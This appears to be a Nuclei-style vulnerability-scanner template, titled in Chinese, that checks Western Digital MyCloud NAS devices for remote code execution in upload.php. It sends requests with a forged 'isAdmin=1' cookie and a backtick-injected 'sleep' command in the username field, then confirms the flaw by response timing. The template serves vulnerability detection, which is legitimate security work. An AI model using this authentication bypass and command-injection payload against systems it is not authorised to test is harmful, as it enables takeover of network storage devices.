id: poc-yaml-west-nas-upload-php-rce
info:
  name: "Western Digital MyCloud NAS upload.php 远程代码执行漏洞"
  author: ProjectDiscoveryAI
  severity: critical
  tags: MyCloud

http:
  - raw:
      - |
        GET /web/php/upload.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: isAdmin=1;username=a`sleep 5`
      - |
        GET /web/php/upload.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: isAdmin=1;username=a`sleep 8`
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<status>timeout</status>"
          - "sleep"
      - type: word
        part: header
        words:
          - "text/xml"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
